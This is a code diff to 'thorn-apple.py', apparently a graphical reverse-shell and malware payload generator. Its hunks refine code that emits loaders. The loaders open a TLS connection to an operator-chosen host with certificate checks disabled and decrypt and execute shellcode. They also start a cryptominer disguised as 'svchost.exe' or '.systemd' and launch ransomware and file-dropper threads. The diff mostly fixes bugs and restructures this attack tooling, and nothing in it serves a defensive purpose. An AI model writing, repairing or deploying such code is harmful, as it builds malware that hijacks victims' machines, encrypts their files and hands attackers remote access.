@@ -1,3 +1,5 @@
+[file name]: thorn-apple.py
+[file content begin]
 import sys
 import random
 import binascii
@@ -1045,8 +1047,6 @@ class ReverseShellGenerator(QMainWindow):
         tls_code = ""
         if self.ssl_cb.isChecked():
             tls_code = f"""
-import ssl
-import socket
 ctx = ssl.create_default_context()
 ctx.check_hostname = False
 ctx.verify_mode = ssl.CERT_NONE
@@ -1056,7 +1056,6 @@ sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 ssl_sock = ctx.wrap_socket(sock, server_hostname="{HTTPS_SNI}")
 ssl_sock.connect(('{self.lhost_input.text()}', {self.lport_input.text()}))
 ssl_sock.sendall(b"GET / HTTP/1.1\\r\\nHost: {HTTPS_SNI}\\r\\n\\r\\n")
-# You can now use ssl_sock for communication
 """
         
         # Domain Fronting Implementation
@@ -1171,43 +1170,33 @@ def start_miner():
     import base64
     import json
     import time
-    import psutil
-    
+    import tempfile
     # Embedded XMRig binary (base64 encoded)
     # This would contain the actual base64-encoded miner binary
     # For demo purposes, we're using a placeholder
-    XMRIG_BINARY = base64.b64decode(""")
-            # Here we would add the actual base64-encoded miner binary
-            # For brevity, we're showing the structure only
-            miner_code += """ "..." """)
-            miner_code += f"""
-    
+    XMRIG_BINARY = base64.b64decode("...")
     # Save miner to temp file
     temp_dir = tempfile.gettempdir()
     miner_path = os.path.join(temp_dir, "svchost.exe" if os.name == 'nt' else ".systemd")
     with open(miner_path, "wb") as f:
         f.write(XMRIG_BINARY)
-    
     if os.name != 'nt':
         os.chmod(miner_path, 0o755)
-    
     # Prepare config
     config = {config_json}
     config_path = os.path.join(temp_dir, "config.json")
     with open(config_path, "w") as f:
         json.dump(config, f)
-    
     # Start miner
     cmd = [
         miner_path,
         "--config", config_path,
-        "--cpu-max-threads-hint", str(config['cpu_percent']),
-        "--background" if config['light_mode'] else ""
+        "--cpu-max-threads-hint", str(config['cpu_percent'])
     ]
-    
+    if config['light_mode']:
+        cmd.append("--background")
     if config['idle_only']:
         cmd.append("--idle")
-    
     subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
     print("[*] Cryptocurrency miner started")
 """
@@ -1273,62 +1262,71 @@ def encrypt_files():
                 pass
 """
         
-        # Add thread starters
+        # Build thread starter code
         thread_code = ""
         if "MINER" in modules:
-            thread_code += """
-    # Start miner thread
-    miner_thread = threading.Thread(target=start_miner)
-    miner_thread.daemon = True
-    miner_thread.start()
-"""
+            thread_code += (
+                "    # Start miner thread\n"
+                "    miner_thread = threading.Thread(target=start_miner)\n"
+                "    miner_thread.daemon = True\n"
+                "    miner_thread.start()\n"
+            )
         if "RANSOMWARE" in modules:
-            thread_code += """
-    # Start ransomware thread
-    ransom_thread = threading.Thread(target=encrypt_files)
-    ransom_thread.daemon = True
-    ransom_thread.start()
-"""
-        if file_data and file_name:
-            thread_code += """
-    # Start file dropper thread
-    dropper_thread = threading.Thread(target=drop_and_execute_file)
-    dropper_thread.daemon = True
-    dropper_thread.start()
-"""
-        
-        # Add to loader template
-        loader_code = f'''#!/usr/bin/env python3
-# Thorn-Apple Payload Loader
-# Military-Grade Encrypted Shellcode Execution
-# Platform: Cross-Platform (Windows/macOS/Linux)
+            thread_code += (
+                "    # Start ransomware thread\n"
+                "    ransom_thread = threading.Thread(target=encrypt_files)\n"
+                "    ransom_thread.daemon = True\n"
+                "    ransom_thread.start()\n"
+            )
+        if file_data and file_name:  # If file dropper is enabled
+            thread_code += (
+                "    # Start file dropper thread\n"
+                "    dropper_thread = threading.Thread(target=drop_and_execute_file)\n"
+                "    dropper_thread.daemon = True\n"
+                "    dropper_thread.start()\n"
+            )
 
-import ctypes
+        loader_code = f"""import ctypes
 import platform
 import binascii
 import time
 import threading
 import tempfile
+import base64
+import json
+import socket
+import ssl
 from Crypto.Cipher import AES, ChaCha20
-{tls_code}
+
 # --- Configuration ---
 ENCRYPTED_SHELLCODE = binascii.unhexlify("{binascii.hexlify(encrypted_shellcode).decode()}")
 ENCRYPTION_KEY = binascii.unhexlify("{binascii.hexlify(key).decode()}")
 NONCE = binascii.unhexlify("{binascii.hexlify(nonce).decode()}")
 METHOD = "{method}"
 
+# Domain fronting code if enabled
 {fronting_code if "DOMAIN_FRONTING" in modules else ""}
+# File dropper code if enabled
 {dropper_code if file_data and file_name else ""}
+# Miner code if enabled
 {miner_code if "MINER" in modules else ""}
+# Ransomware code if enabled
 {ransomware_code if "RANSOMWARE" in modules else ""}
 
 def decrypt_shellcode():
     if METHOD == "AES-256-GCM":
+        # Split the encrypted shellcode: last 16 bytes are the tag
         ciphertext = ENCRYPTED_SHELLCODE[:-16]
         tag = ENCRYPTED_SHELLCODE[-16:]
         cipher = AES.new(ENCRYPTION_KEY, AES.MODE_GCM, nonce=NONCE)
-        return cipher.decrypt_and_verify(ciphertext, tag)
-    else:
+        try:
+            plaintext = cipher.decrypt_and_verify(ciphertext, tag)
+        except ValueError as e:
+            print(f"[!] Decryption failed: {{str(e)}}")
+            return None
+        return plaintext
+    else:  # ChaCha20-Poly1305
+        # Split the encrypted shellcode: last 16 bytes are the MAC
         ciphertext = ENCRYPTED_SHELLCODE[:-16]
         mac = ENCRYPTED_SHELLCODE[-16:]
         cipher = ChaCha20.new(key=ENCRYPTION_KEY, nonce=NONCE)
@@ -1406,14 +1404,17 @@ if __name__ == "__main__":
     try:
         print("[-] Thorn-Apple Payload Initializing...")
 {sleep_code}
-        {thread_code}
+{thread_code}
         shellcode = decrypt_shellcode()
+        if shellcode is None:
+            print("[!] Decryption failed, exiting.")
+            exit(1)
         print("[-] Executing payload...")
         execute_shellcode(shellcode)
         print("[-] Payload execution completed")
     except Exception as e:
         print(f"[!] Error: {{str(e)}}")
-'''
+"""
         return loader_code
 
     def display_results(self, orig_shellcode, enc_shellcode, key, nonce):
@@ -1487,7 +1488,7 @@ if __name__ == "__main__":
         self.output_text.setPlainText(result)
     
     def save_payload(self):
-        """Save payload to file with appropriate extension"""
+        "Save payload to file with appropriate extension"
         if not self.generated_payload or not self.encrypted_shellcode:
             return
             
@@ -1528,7 +1529,7 @@ if __name__ == "__main__":
             self.output_text.append(f"\n\nError saving payload: {str(e)}")
     
     def closeEvent(self, event):
-        """Clean up when closing the application"""
+        "Clean up when closing the application"
         if self.listener_thread and self.listener_thread.isRunning():
             self.listener_thread.stop()
             self.listener_thread.quit()
@@ -1549,3 +1550,4 @@ if __name__ == "__main__":
     window = ReverseShellGenerator()
     window.show()
     sys.exit(app.exec_())
+[file content end]
